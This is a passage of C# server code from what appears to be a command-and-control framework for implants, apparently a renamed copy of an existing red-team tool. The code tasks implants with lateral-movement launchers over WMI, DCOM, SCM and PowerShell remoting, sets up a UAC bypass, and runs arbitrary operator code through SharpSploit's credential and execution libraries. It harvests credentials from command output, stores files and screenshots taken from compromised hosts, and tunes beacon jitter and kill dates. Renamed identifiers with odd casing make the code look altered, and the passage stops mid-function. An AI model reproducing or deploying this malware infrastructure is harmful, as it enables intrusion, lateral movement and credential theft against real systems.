        public async Task<IEnumerable<GrawlCommand>> GetGrawlCommandsForGrawl(int grawlId)
        {
            return await _context.GrawlCommands
                .Where(GC => GC.GrawlId == grawlId)
                .Include(GC => GC.User)
                .Include(GC => GC.GrawlTasking)
                    .ThenInclude(GT => GT.GrawlTask)
                .ToListAsync();
        }

        public async Task<GrawlCommand> GetGrawlCommand(int id)
        {
            GrawlCommand command = await _context.GrawlCommands
                .Where(GC => GC.Id == id)
                .Include(GC => GC.User)
                .Include(GC => GC.GrawlTasking)
                    .ThenInclude(GT => GT.GrawlTask)
                .FirstOrDefaultAsync();
            if (command == null)
            {
                throw new ControllerNotFoundException($"NotFound - GrawlCommand with Id: {id}");
            }
            return command;
        }

        public async Task<GrawlCommand> CreateGrawlCommand(GrawlCommand command)
        {
            await _context.GrawlCommands.AddAsync(command);
            await _context.SaveChangesAsync();
            command.Grawl = await this.GetGrawl(command.GrawlId);
            command.User = await this.GetUser(command.UserId);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrawlCommand(this, command);
            return command;
        }

        public async Task<IEnumerable<GrawlCommand>> CreateGrawlCommands(params GrawlCommand[] commands)
        {
            await _context.GrawlCommands.AddRangeAsync(commands);
            await _context.SaveChangesAsync();
            return commands;
        }

        public async Task<GrawlCommand> EditGrawlCommand(GrawlCommand command)
        {
            GrawlCommand updatingCommand = await this.GetGrawlCommand(command.Id);
            updatingCommand.Command = command.Command;
            updatingCommand.CommandTime = command.CommandTime;
            updatingCommand.CommandOutput ??= await this.GetCommandOutput(updatingCommand.CommandOutputId);
            if (updatingCommand.CommandOutput.Output != command.CommandOutput.Output)
            {
                updatingCommand.CommandOutput.Output = command.CommandOutput.Output;
                _context.CommandOutputs.Update(updatingCommand.CommandOutput);
                await _context.SaveChangesAsync();
                await _notifier.NotifyEditCommandOutput(this, updatingCommand.CommandOutput);

                List<CapturedCredential> capturedCredentials = CapturedCredential.ParseCredentials(updatingCommand.CommandOutput.Output);
                foreach (CapturedCredential cred in capturedCredentials)
                {
                    if (!await this.ContainsCredentials(cred))
                    {
                        await _context.Credentials.AddAsync(cred);
                        await _context.SaveChangesAsync();
                        // _notifier.OnCreateCapturedCredential(this, cred);
                    }
                }
            }
            updatingCommand.GrawlTaskingId = command.GrawlTaskingId;
            if (updatingCommand.GrawlTaskingId > 0)
            {
                updatingCommand.GrawlTasking ??= await this.GetGrawlTasking(updatingCommand.GrawlTaskingId ?? default);
            }
            _context.GrawlCommands.Update(updatingCommand);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditGrawlCommand(this, updatingCommand);
            return updatingCommand;
        }

        public async Task DeleteGrawlCommand(int id)
        {
            GrawlCommand command = await this.GetGrawlCommand(id);
            _context.GrawlCommands.Remove(command);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteGrawlCommand(this, command.Id);
        }

        private string GetCommandFromInput(string UserInput, List<ParsedParameter> parameters, GrawlTask task = null)
        {
            if (task != null)
            {
                for (int i = 0; i < task.Options.Count; i++)
                {
                    if (!task.Options[i].DisplayInCommand && parameters.Count > (i + 1))
                    {
                        UserInput = UserInput.Replace($@"/{parameters[i + 1].Label}:""{parameters[i + 1].Value}""", "");
                    }
                }
            }
            return UserInput;
        }

        public async Task<string> ParseParametersIntoTask(GrawlTask task, List<ParsedParameter> parameters)
        {
            parameters = parameters.Skip(1).ToList();
            if (parameters.Count() < task.Options.Where(O => !O.FileOption).Count(O => !O.Optional))
            {
                this.DisposeContext();
                return ConsoleWriter.PrintFormattedErrorLine(await this.GetUsageForGrawlTask(task));
            }
            // All options begin unassigned
            List<bool> OptionAssignments = task.Options.Select(O => false).ToList();
            task.Options.ForEach(O => O.Value = "");
            for (int i = 0; i < parameters.Count; i++)
            {
                if (parameters[i].IsLabeled)
                {
                    var option = task.Options.FirstOrDefault(O => O.Name.Equals(parameters[i].Label, StringComparison.OrdinalIgnoreCase));
                    if (option != null)
                    {
                        option.Value = parameters[i].Value;
                        OptionAssignments[task.Options.IndexOf(option)] = true;
                    }
                }
                else
                {
                    GrawlTaskOption nextOption = null;
                    // Find next unassigned option
                    for (int j = 0; j < task.Options.Count; j++)
                    {
                        if (!OptionAssignments[j] && !task.Options[j].FileOption)
                        {
                            nextOption = task.Options[j];
                            OptionAssignments[j] = true;
                            break;
                        }
                    }
                    if (nextOption == null)
                    {
                        // This is an extra parameter
                        return ConsoleWriter.PrintFormattedErrorLine(await this.GetUsageForGrawlTask(task));
                    }
                    nextOption.Value = parameters[i].Value;
                }
            }

            // Check for unassigned required options
            for (int i = 0; i < task.Options.Count; i++)
            {
                if (!OptionAssignments[i] && !task.Options[i].Optional)
                {
                    // This is an extra parameter
                    StringBuilder toPrint = new StringBuilder();
                    toPrint.Append(ConsoleWriter.PrintFormattedErrorLine(task.Options[i].Name + " is required."));
                    toPrint.Append(ConsoleWriter.PrintFormattedErrorLine(await this.GetUsageForGrawlTask(task)));
                    this.DisposeContext();
                    return toPrint.ToString();
                }
            }
            return null;
        }

        private async Task<string> StartHelpCommand(Grawl grawl, List<ParsedParameter> parameters)
        {
            string Name = "Help";
            if ((parameters.Count() != 1 && parameters.Count() != 2) || !parameters[0].Value.Equals(Name, StringComparison.OrdinalIgnoreCase))
            {
                StringBuilder toPrint1 = new StringBuilder();
                toPrint1.Append(ConsoleWriter.PrintFormattedErrorLine("Usage: Help <task_name>"));
                return toPrint1.ToString();
            }
            StringBuilder toPrint = new StringBuilder();
            foreach (GrawlTask t in await this.GetGrawlTasks())
            {
                if (!t.CompatibleDotNetVersions.Contains(grawl.DotNetVersion))
                {
                    continue;
                }
                if (parameters.Count() == 1)
                {
                    toPrint.AppendLine($"{t.Name}\t\t{t.Description}");
                }
                else if (parameters.Count() == 2 && t.Name.Equals(parameters[1].Value, StringComparison.CurrentCultureIgnoreCase))
                {
                    string usage = t.Name;
                    t.Options.ForEach(O =>
                    {
                        usage += O.Optional ? $" [ <{O.Name.Replace(" ", "_").ToLower()}> ]" : $" <{O.Name.Replace(" ", "_").ToLower()}>";
                    });
                    string libraries = string.Join(",", t.ReferenceSourceLibraries.Select(RSL => RSL.Name));
                    string assemblies = string.Join(",", t.ReferenceAssemblies.Select(RA => RA.Name));
                    string resources = string.Join(",", t.EmbeddedResources.Select(ER => ER.Name));
                    toPrint.AppendLine($"Name: {t.Name}");
                    toPrint.AppendLine($"Description: {t.Description}");
                    toPrint.AppendLine($"Usage: {usage}");
                    toPrint.AppendLine($"ReferenceSourceLibraries: " + (string.IsNullOrEmpty(libraries) ? "None" : libraries));
                    toPrint.AppendLine($"ReferenceAssemblies: " + (string.IsNullOrEmpty(assemblies) ? "None" : assemblies));
                    toPrint.AppendLine($"EmbeddedResources: " + (string.IsNullOrEmpty(resources) ? "None" : resources));
                    if (!string.IsNullOrEmpty(t.Help))
                    {
                        toPrint.AppendLine($"Help: {t.Help}");
                    }
                    break;
                }
            }
            return toPrint.ToString();
        }

        private async Task<GrawlTasking> StartGrawlTasking(Grawl grawl, GrawlTask task, GrawlCommand command)
        {
            return await this.CreateGrawlTasking(new GrawlTasking
            {
                GrawlTaskId = task.Id,
                GrawlId = grawl.Id,
                Type = task.TaskingType,
                Status = GrawlTaskingStatus.Uninitialized,
                GrawlCommandId = command.Id,
                GrawlCommand = command
            });
        }
        #endregion

        #region CommandOutput Actions
        public async Task<IEnumerable<CommandOutput>> GetCommandOutputs()
        {
            return await _context.CommandOutputs
                .ToListAsync();
        }

        public async Task<CommandOutput> GetCommandOutput(int commandOutputId)
        {
            CommandOutput output = await _context.CommandOutputs
                .Where(CO => CO.Id == commandOutputId)
                .FirstOrDefaultAsync();
            if (output == null)
            {
                throw new ControllerNotFoundException($"NotFound - CommandOutput with Id: {commandOutputId}");
            }
            return output;
        }

        public async Task<CommandOutput> CreateCommandOutput(CommandOutput output)
        {
            await _context.CommandOutputs.AddAsync(output);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateCommandOutput(this, output);
            // _notifier.OnCreateCommandOutput(this, output);
            return output;
        }

        public async Task<IEnumerable<CommandOutput>> CreateCommandOutputs(params CommandOutput[] outputs)
        {
            await _context.CommandOutputs.AddRangeAsync(outputs);
            await _context.SaveChangesAsync();
            return outputs;
        }

        public async Task<CommandOutput> EditCommandOutput(CommandOutput output)
        {
            CommandOutput updatingOutput = await this.GetCommandOutput(output.Id);
            updatingOutput.Output = output.Output;
            _context.CommandOutputs.Update(updatingOutput);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditCommandOutput(this, updatingOutput);
            List<CapturedCredential> capturedCredentials = CapturedCredential.ParseCredentials(updatingOutput.Output);
            foreach (CapturedCredential cred in capturedCredentials)
            {
                if (!await this.ContainsCredentials(cred))
                {
                    await _context.Credentials.AddAsync(cred);
                    await _context.SaveChangesAsync();
                    // _notifier.OnCreateCapturedCredential(this, cred);
                }
            }
            return updatingOutput;
        }

        public async Task DeleteCommandOutput(int id)
        {
            CommandOutput output = await this.GetCommandOutput(id);
            _context.CommandOutputs.Remove(output);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteCommandOutput(this, output.Id);
        }
        #endregion

        #region GrawlTasking Actions
        public async Task<IEnumerable<GrawlTasking>> GetGrawlTaskings()
        {
            return await _context.GrawlTaskings
                .Include(GT => GT.Grawl)
                .Include(GT => GT.GrawlTask)
                .Include(GT => GT.GrawlCommand)
                    .ThenInclude(GC => GC.User)
                .ToListAsync();
        }

        public async Task<IEnumerable<GrawlTasking>> GetGrawlTaskingsForGrawl(int grawlId)
        {
            return await _context.GrawlTaskings
                .Where(GT => GT.GrawlId == grawlId)
                .Include(GT => GT.Grawl)
                .Include(GT => GT.GrawlTask)
                .Include(GT => GT.GrawlCommand)
                    .ThenInclude(GC => GC.User)
                .ToListAsync();
        }

        public async Task<IEnumerable<GrawlTasking>> GetUninitializedGrawlTaskingsForGrawl(int grawlId)
        {
            return await _context.GrawlTaskings
                .Where(GT => GT.GrawlId == grawlId && GT.Status == GrawlTaskingStatus.Uninitialized)
                .Include(GT => GT.Grawl)
                .Include(GT => GT.GrawlTask)
                .Include(GT => GT.GrawlCommand)
                    .ThenInclude(GC => GC.User)
                .ToListAsync();
        }

        public async Task<IEnumerable<GrawlTasking>> GetGrawlTaskingsSearch(int grawlId)
        {
            List<GrawlTasking> search = new List<GrawlTasking>();
            foreach (GrawlTasking task in await this.GetGrawlTaskings())
            {
                if (await this.IsChildGrawl(grawlId, task.GrawlId))
                {
                    search.Add(task);
                }
            }
            return search;
        }

        public async Task<GrawlTasking> GetGrawlTasking(int taskingId)
        {
            GrawlTasking tasking = await _context.GrawlTaskings
                .Where(GT => GT.Id == taskingId)
                .Include(GT => GT.Grawl)
                .Include(GT => GT.GrawlTask)
                .Include(GC => GC.GrawlCommand)
                    .ThenInclude(GC => GC.User)
                .FirstOrDefaultAsync();
            if (tasking == null)
            {
                throw new ControllerNotFoundException($"NotFound - GrawlTasking with id: {taskingId}");
            }
            return tasking;
        }

        public async Task<GrawlTasking> GetGrawlTaskingByName(string taskingName)
        {
            GrawlTasking tasking = await _context.GrawlTaskings
                .Where(GT => GT.Name == taskingName)
                .Include(GT => GT.Grawl)
                .Include(GT => GT.GrawlTask)
                .Include(GT => GT.GrawlCommand)
                    .ThenInclude(GC => GC.User)
                .FirstOrDefaultAsync();
            if (tasking == null)
            {
                throw new ControllerNotFoundException($"NotFound - GrawlTasking with Name: {taskingName}");
            }
            return tasking;
        }

        public async Task<GrawlTasking> CreateGrawlTasking(GrawlTasking tasking)
        {
            tasking.Grawl = await this.GetGrawl(tasking.GrawlId);
            tasking.Grawl.Listener = await this.GetListener(tasking.Grawl.ListenerId);
            tasking.GrawlTask = await this.GetGrawlTask(tasking.GrawlTaskId);
            tasking.GrawlCommand = await this.GetGrawlCommand(tasking.GrawlCommandId);
            tasking.GrawlCommand.CommandOutput ??= await this.GetCommandOutput(tasking.GrawlCommand.CommandOutputId);
            List<string> parameters = tasking.GrawlTask.Options.OrderBy(O => O.Id).Select(O => string.IsNullOrEmpty(O.Value) ? O.DefaultValue : O.Value).ToList();
            if (tasking.GrawlTask.Name.Equals("powershell", StringComparison.OrdinalIgnoreCase) && !string.IsNullOrWhiteSpace(tasking.Grawl.PowerShellImport))
            {
                parameters[0] = Common.RedWolfEncoding.GetString(Convert.FromBase64String(tasking.Grawl.PowerShellImport)) + "\r\n" + parameters[0];
            }
            else if (tasking.GrawlTask.Name.Equals("powershellimport", StringComparison.OrdinalIgnoreCase))
            {
                if (parameters.Count >= 1)
                {
                    string import = parameters[0];
                    byte[] importBytes = Convert.FromBase64String(import);
                    if (importBytes.Length >= 3 && importBytes[0] == 0xEF && importBytes[1] == 0xBB && importBytes[2] == 0xBF)
                    {
                        import = Convert.ToBase64String(importBytes.Skip(3).ToArray());
                    }
                    tasking.Grawl.PowerShellImport = import;
                }
                else
                {
                    tasking.Grawl.PowerShellImport = "";
                }
                _context.Grawls.Update(tasking.Grawl);
                tasking.GrawlCommand.CommandOutput.Output = "PowerShell Imported";

                _context.GrawlCommands.Update(tasking.GrawlCommand);
                await _context.SaveChangesAsync();
                await _notifier.NotifyEditGrawl(this, tasking.Grawl);
                await _notifier.NotifyEditGrawlCommand(this, tasking.GrawlCommand);
                tasking.Status = GrawlTaskingStatus.Completed;
            }
            else if (tasking.GrawlTask.Name.Equals("wmigrawl", StringComparison.OrdinalIgnoreCase))
            {
                Launcher l = await _context.Launchers.FirstOrDefaultAsync(L => L.Name.ToLower() == parameters[1].ToLower());
                if (l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                {
                    throw new ControllerNotFoundException($"NotFound - Launcher with name: {parameters[1]}");
                }

                // Add .exe extension if needed
                List<string> split = l.LauncherString.Split(" ").ToList();
                parameters[1] = split.FirstOrDefault();
                if (!parameters[1].EndsWith(".exe", StringComparison.OrdinalIgnoreCase)) { parameters[1] += ".exe"; }

                // Add Directory
                string Directory = "C:\\Windows\\System32\\";
                if (parameters[1].Equals("powershell.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "WindowsPowerShell\\v1.0\\"; }
                else if (parameters[1].Equals("wmic.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "wbem\\"; }
                if (!parameters[1].StartsWith("C:\\", StringComparison.OrdinalIgnoreCase)) { parameters[1] = Directory + parameters[1]; }
                if (split.Count > 1) { parameters[1] += " " + String.Join(" ", split.Skip(1).ToArray()); }
            }
            else if (tasking.GrawlTask.Name.Equals("scmgrawl", StringComparison.OrdinalIgnoreCase))
            {
                Launcher l = await _context.Launchers.FirstOrDefaultAsync(L => L.Name.ToLower() == parameters[1].ToLower());
                if (l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                {
                    throw new ControllerNotFoundException($"NotFound - Layncher with name: {parameters[1]}");

                }
                parameters[1] = ((ServiceBinaryLauncher) l).DiskCode;
            }
            else if (tasking.GrawlTask.Name.Equals("dcomgrawl", StringComparison.OrdinalIgnoreCase))
            {
                Launcher l = await _context.Launchers.FirstOrDefaultAsync(L => L.Name.ToLower() == parameters[1].ToLower());
                if (l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                {
                    throw new ControllerNotFoundException($"NotFound - Launcher with name: {parameters[1]}");
                }
                // Add .exe extension if needed
                List<string> split = l.LauncherString.Split(" ").ToList();
                parameters[1] = split.FirstOrDefault();
                if (!parameters[1].EndsWith(".exe", StringComparison.OrdinalIgnoreCase)) { parameters[1] += ".exe"; }

                // Add command parameters
                split.RemoveAt(0);
                parameters.Insert(2, String.Join(" ", split.ToArray()));

                // Add Directory
                string Directory = "C:\\Windows\\System32\\";
                if (parameters[1].Equals("powershell.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "WindowsPowerShell\\v1.0\\"; }
                else if (parameters[1].Equals("wmic.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "wbem\\"; }
                if (!parameters[1].StartsWith("C:\\", StringComparison.OrdinalIgnoreCase)) { parameters[1] = Directory + parameters[1]; }

                parameters.Insert(3, Directory);
            }
            else if (tasking.GrawlTask.Name.Equals("powershellremotinggrawl", StringComparison.OrdinalIgnoreCase))
            {
                Launcher l = await _context.Launchers.FirstOrDefaultAsync(L => L.Name.ToLower() == parameters[1].ToLower());
                if (l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                {
                    throw new ControllerNotFoundException($"NotFound - Launcher with name: {parameters[1]}");
                }
                // Add .exe extension if needed
                List<string> split = l.LauncherString.Split(" ").ToList();
                parameters[1] = split.FirstOrDefault();
                if (!parameters[1].EndsWith(".exe", StringComparison.OrdinalIgnoreCase)) { parameters[1] += ".exe"; }
                // Add Directory
                string Directory = "C:\\Windows\\System32\\";
                if (parameters[1].Equals("powershell.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "WindowsPowerShell\\v1.0\\"; }
                else if (parameters[1].Equals("wmic.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "wbem\\"; }
                if (!parameters[1].StartsWith("C:\\", StringComparison.OrdinalIgnoreCase)) { parameters[1] = Directory + parameters[1]; }
                parameters[1] = parameters[1] + " " + string.Join(" ", split.Skip(1).ToList());
            }
            else if (tasking.GrawlTask.Name.Equals("bypassuacgrawl", StringComparison.OrdinalIgnoreCase))
            {
                Launcher l = await _context.Launchers.FirstOrDefaultAsync(L => L.Name.ToLower() == parameters[0].ToLower());
                if (l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                {
                    throw new ControllerNotFoundException($"NotFound - Launcher with name: {parameters[0]}");
                }
                // Add .exe extension if needed
                string[] split = l.LauncherString.Split(" ");
                parameters[0] = split.FirstOrDefault();
                if (!parameters[0].EndsWith(".exe", StringComparison.OrdinalIgnoreCase)) { parameters[0] += ".exe"; }

                // Add parameters need for BypassUAC Task
                string ArgParams = String.Join(" ", split.ToList().GetRange(1, split.Count() - 1));
                string Directory = "C:\\Windows\\System32\\";
                if (parameters[0].Equals("powershell.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "WindowsPowerShell\\v1.0\\"; }
                else if (parameters[0].Equals("wmic.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "wbem\\"; }

                parameters.Add(ArgParams);
                parameters.Add(Directory);
                parameters.Add("0");
            }
            else if (tasking.GrawlTask.Name.Equals("SharpShell", StringComparison.CurrentCultureIgnoreCase))
            {
                string WrapperFunctionFormat =
    @"using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Security;
using System.Security.Principal;
using System.Collections.Generic;
using SharpSploit.Credentials;
using SharpSploit.Enumeration;
using SharpSploit.Execution;
using SharpSploit.Generic;
using SharpSploit.Misc;
using SharpSploit.LateralMovement;

public static class Task
{{
    public static string Execute()
    {{
        {0}
    }}
}}";
                string csharpcode = string.Join(" ", parameters);
                tasking.GrawlTask.Code = string.Format(WrapperFunctionFormat, csharpcode);
                tasking.GrawlTask.Compiled = false;
                _context.GrawlTasks.Update(tasking.GrawlTask);
                await _context.SaveChangesAsync();
                parameters = new List<string> { };
            }
            else if (tasking.GrawlTask.Name.Equals("Disconnect", StringComparison.CurrentCultureIgnoreCase))
            {
                Grawl g = await this.GetGrawlByName(parameters[0]);
                parameters[0] = g.ANOTHERID;
            }
            else if (tasking.GrawlTask.Name.Equals("Connect", StringComparison.CurrentCultureIgnoreCase))
            {
                parameters[0] = parameters[0] == "localhost" ? tasking.Grawl.Hostname : parameters[0];
                parameters[0] = parameters[0] == "127.0.0.1" ? tasking.Grawl.IPAddress : parameters[0];
            }
            tasking.Parameters = parameters;
            try
            {
                tasking.GrawlTask.Compile(tasking.Grawl.ImplantTemplate, tasking.Grawl.RuntimeIdentifier);
            }
            catch (CompilerException e)
            {
                tasking.GrawlCommand.CommandOutput.Output = "CompilerException: " + e.Message;
                tasking.Status = GrawlTaskingStatus.Aborted;
                _context.GrawlCommands.Update(tasking.GrawlCommand);
                await _context.SaveChangesAsync();
                await _notifier.NotifyEditGrawlCommand(this, tasking.GrawlCommand);
            }
            await _context.GrawlTaskings.AddAsync(tasking);
            await _context.SaveChangesAsync();
            tasking.GrawlCommand.GrawlTaskingId = tasking.Id;
            tasking.GrawlCommand.GrawlTasking = tasking;
            await this.EditGrawlCommand(tasking.GrawlCommand);
            Grawl parent = (await this.GetParentGrawl(tasking.Grawl)) ?? tasking.Grawl;
            parent.Listener = await this.GetListener(parent.ListenerId);
            await _notifier.NotifyCreateGrawlTasking(this, tasking);
            await _notifier.NotifyNotifyListener(this, parent);
            return tasking;
        }

        public async Task<IEnumerable<GrawlTasking>> CreateGrawlTaskings(params GrawlTasking[] taskings)
        {
            await _context.GrawlTaskings.AddRangeAsync(taskings);
            await _context.SaveChangesAsync();
            return taskings;
        }

        public async Task<GrawlTasking> EditGrawlTasking(GrawlTasking tasking)
        {
            Grawl grawl = await this.GetGrawl(tasking.GrawlId);
            GrawlTasking updatingGrawlTasking = await _context.GrawlTaskings
                .Where(GT => GT.Id == tasking.Id)
                .Include(GT => GT.GrawlTask)
                .Include(GT => GT.GrawlCommand)
                    .ThenInclude(GC => GC.CommandOutput)
                .Include(GT => GT.GrawlCommand)
                    .ThenInclude(GC => GC.User)
                .FirstOrDefaultAsync();
            if (updatingGrawlTasking == null)
            {
                throw new ControllerNotFoundException($"NotFound - GrawlTasking with id: {tasking.Id}");
            }

            GrawlTaskingStatus newStatus = tasking.Status;
            GrawlTaskingStatus originalStatus = updatingGrawlTasking.Status;
            if ((originalStatus == GrawlTaskingStatus.Tasked || originalStatus == GrawlTaskingStatus.Progressed) &&
                (newStatus == GrawlTaskingStatus.Progressed || newStatus == GrawlTaskingStatus.Completed))
            {
                if (tasking.Type == GrawlTaskingType.Exit)
                {
                    grawl.Status = GrawlStatus.Exited;
                }
                else if ((tasking.Type == GrawlTaskingType.SetDelay || tasking.Type == GrawlTaskingType.SetJItter ||
                    tasking.Type == GrawlTaskingType.SetConneCTAttEmpts) && tasking.Parameters.Count >= 1 && int.TryParse(tasking.Parameters[0], out int n))
                {
                    if (tasking.Type == GrawlTaskingType.SetDelay)
                    {
                        grawl.Delay = n;
                    }
                    else if (tasking.Type == GrawlTaskingType.SetJItter)
                    {
                        grawl.JItterPercent = n;
                    }
                    else if (tasking.Type == GrawlTaskingType.SetConneCTAttEmpts)
                    {
                        grawl.ConneCTAttEmpts = n;
                    }
                    _context.Grawls.Update(grawl);
                    await _notifier.NotifyEditGrawl(this, grawl);
                }
                else if (tasking.Type == GrawlTaskingType.SetKillDate && tasking.Parameters.Count >= 1 && DateTime.TryParse(tasking.Parameters[0], out DateTime date))
                {
                    grawl.KillDate = date;
                    _context.Grawls.Update(grawl);
                    await _notifier.NotifyEditGrawl(this, grawl);
                }
                else if (tasking.Type == GrawlTaskingType.Connect)
                {
                    // Check if this Grawl was already connected
                    string hostname = tasking.Parameters[0];
                    string pipename = tasking.Parameters[1];
                    Grawl connectedGrawl = tasking.Parameters.Count >= 3 ? await this.GetGrawlByANOTHERID(tasking.Parameters[2]) :
                        await _context.Grawls.Where(G =>
                            G.Status != GrawlStatus.Exited &&
                            G.ImplantTemplate.CommType == CommunicationType.SMB &&
                            ((G.IPAddress == hostname || G.Hostname == hostname) || (G.IPAddress == "" && G.Hostname == "")) &&
                            G.SMBPipeName == pipename
                        ).OrderByDescending(G => G.ActivationTime)
                        .Include(G => G.ImplantTemplate)
                        .FirstOrDefaultAsync();
                    if (connectedGrawl == null)
                    {
                        throw new ControllerNotFoundException($"NotFound - Grawl staging from {hostname}:{pipename}");
                    }
                    else
                    {
                        Grawl connectedGrawlParent = _context.Grawls.AsEnumerable().FirstOrDefault(G => G.Children.Contains(connectedGrawl.ANOTHERID));
                        if (connectedGrawlParent != null)
                        {
                            connectedGrawlParent.RemoveChild(connectedGrawl);
                            _context.Grawls.Update(connectedGrawlParent);
                            // Connect to tasked Grawl, no need to "Progress", as Grawl is already staged
                            grawl.AddChild(connectedGrawl);
                            connectedGrawl.Status = GrawlStatus.Active;
                            _context.Grawls.Update(connectedGrawl);
                            await _notifier.NotifyEditGrawl(this, connectedGrawl);
                        }
                        else
                        {
                            grawl.AddChild(connectedGrawl);
                            if (connectedGrawl.Status == GrawlStatus.Disconnected)
                            {
                                connectedGrawl.Status = GrawlStatus.Active;
                                _context.Grawls.Update(connectedGrawl);
                                await _notifier.NotifyEditGrawl(this, connectedGrawl);
                            }
                        }
                        await _context.Grawls.Where(G =>
                            G.ANOTHERID != connectedGrawl.ANOTHERID && G.ANOTHERID != grawl.ANOTHERID &&
                            G.Status != GrawlStatus.Exited &&
                            G.ImplantTemplate.CommType == CommunicationType.SMB &&
                            ((G.IPAddress == hostname || G.Hostname == hostname) || (G.IPAddress == "" && G.Hostname == "")) &&
                            G.SMBPipeName == pipename
                        ).ForEachAsync(G =>
                        {
                            G.Status = GrawlStatus.Exited;
                            _context.Update(G);
                            _notifier.NotifyEditGrawl(this, G).Wait();
                        });
                    }
                }
                else if (tasking.Type == GrawlTaskingType.Disconnect)
                {
                    Grawl disconnectFromGrawl = await this.GetGrawlByANOTHERID(tasking.Parameters[0]);
                    disconnectFromGrawl.Status = GrawlStatus.Disconnected;
                    _context.Grawls.Update(disconnectFromGrawl);
                    await _notifier.NotifyEditGrawl(this, disconnectFromGrawl);
                    grawl.RemoveChild(disconnectFromGrawl);
                    _context.Grawls.Update(grawl);
                    await _notifier.NotifyEditGrawl(this, grawl);
                }
            }
            Event ev = null;
            if ((newStatus == GrawlTaskingStatus.Completed || newStatus == GrawlTaskingStatus.Progressed) && originalStatus != newStatus)
            {
                if (newStatus == GrawlTaskingStatus.Completed)
                {
                    updatingGrawlTasking.CompletionTime = DateTime.UtcNow;
                }
                string verb = newStatus == GrawlTaskingStatus.Completed ? "completed" : "progressed";
                GrawlTask DownloadTask = null;
                GrawlTask ScreenshotTask = null;
                try
                {
                    DownloadTask = await this.GetGrawlTaskByName("Download", grawl.DotNetVersion);
                    ScreenshotTask = await this.GetGrawlTaskByName("ScreenShot", grawl.DotNetVersion);
                }
                catch (ControllerNotFoundException) { }

                if (DownloadTask != null && tasking.GrawlTaskId == DownloadTask.Id && newStatus == GrawlTaskingStatus.Completed)
                {
                    string FileName = tasking.Parameters[0];
                    DownloadEvent downloadEvent = new DownloadEvent
                    {
                        Time = updatingGrawlTasking.CompletionTime,
                        MessageHeader = "Download Completed",
                        MessageBody = "Downloaded: " + FileName,
                        Level = EventLevel.Info,
                        Context = grawl.Name,
                        FileName = FileName,
                        FileContents = updatingGrawlTasking.GrawlCommand.CommandOutput.Output,
                        Progress = DownloadEvent.DownloadProgress.Complete
                    };
                    downloadEvent.WriteToDisk();
                    await _context.Events.AddAsync(downloadEvent);
                    await _notifier.NotifyCreateEvent(this, downloadEvent);
                }
                else if (ScreenshotTask != null && tasking.GrawlTaskId == ScreenshotTask.Id && newStatus == GrawlTaskingStatus.Completed)
                {
                    string FileName = tasking.Name + ".png";
                    ScreenshotEvent screenshotEvent = new ScreenshotEvent
                    {
                        Time = updatingGrawlTasking.CompletionTime,
                        MessageHeader = "Download ScreenShot Completed",
                        MessageBody = "Downloaded screenshot: " + FileName,
                        Level = EventLevel.Info,
                        Context = grawl.Name,
                        FileName = FileName,
                        FileContents = updatingGrawlTasking.GrawlCommand.CommandOutput.Output,
                        Progress = DownloadEvent.DownloadProgress.Complete
                    };
                    screenshotEvent.WriteToDisk();
                    await _context.Events.AddAsync(screenshotEvent);
                    await _notifier.NotifyCreateEvent(this, screenshotEvent);
                }
            }
            updatingGrawlTasking.TaskingTime = tasking.TaskingTime;
            updatingGrawlTasking.Status = newStatus;
            _context.Grawls.Update(grawl);
            _context.GrawlTaskings.Update(updatingGrawlTasking);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditGrawl(this, grawl);
            await _notifier.NotifyEditGrawlTasking(this, updatingGrawlTasking);
            if (ev != null)
            {
                tasking.GrawlCommand = await _context.GrawlCommands
                    .Where(GC => GC.Id == tasking.GrawlCommandId)
                    .Include(GC => GC.User)
                    .Include(GC => GC.CommandOutput)
                    .Include(GC => GC.GrawlTasking)
                        .ThenInclude(GC => GC.GrawlTask)
                    .FirstOrDefaultAsync();
                await _notifier.NotifyEditGrawlCommand(this, tasking.GrawlCommand);
            }
            return await this.GetGrawlTasking(updatingGrawlTasking.Id);
        }

        public async Task DeleteGrawlTasking(int taskingId)
        {
            GrawlTasking removingGrawlTasking = await _context.GrawlTaskings.FirstOrDefaultAsync(GT => GT.Id == taskingId);
            if (removingGrawlTasking == null)
            {
                throw new ControllerNotFoundException($"NotFound - GrawlTasking with id: {taskingId}");
            }
            _context.GrawlTaskings.Remove(removingGrawlTasking);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteGrawlTasking(this, removingGrawlTasking.Id);
        }

        private async Task<Grawl> GetParentGrawl(Grawl child)
        {
            // var parent = child.ImplantTemplate.CommType != CommunicationType.SMB ? child : await _context.Grawls.Include(G => G.ImplantTemplate).FirstOrDefaultAsync(G => G.Children.Contains(child.ANOTHERID));
            Grawl parent;
            if (child.ImplantTemplate.CommType != CommunicationType.SMB)
            {
                parent = child;
            }
            else
            {
                List<Grawl> grawls = await _context.Grawls.Include(G => G.ImplantTemplate).ToListAsync();
                parent = grawls.FirstOrDefault(G => G.Children.Contains(child.ANOTHERID));
            }
            if (parent != null && parent.ImplantTemplate.CommType == CommunicationType.SMB)
            {
                return await GetParentGrawl(parent);
            }
            return parent;
        }

        private async Task<bool> IsChildGrawl(int ParentId, int ChildId)
        {
            if (ParentId == ChildId)
            {
                return true;
            }
            Grawl parentGrawl = await _context.Grawls.FirstOrDefaultAsync(G => G.Id == ParentId);
            Grawl childGrawl = await _context.Grawls.FirstOrDefaultAsync(G => G.Id == ChildId);
            if (parentGrawl == null || childGrawl == null)
            {
                return false;
            }
            if (parentGrawl.Children.Contains(childGrawl.ANOTHERID))
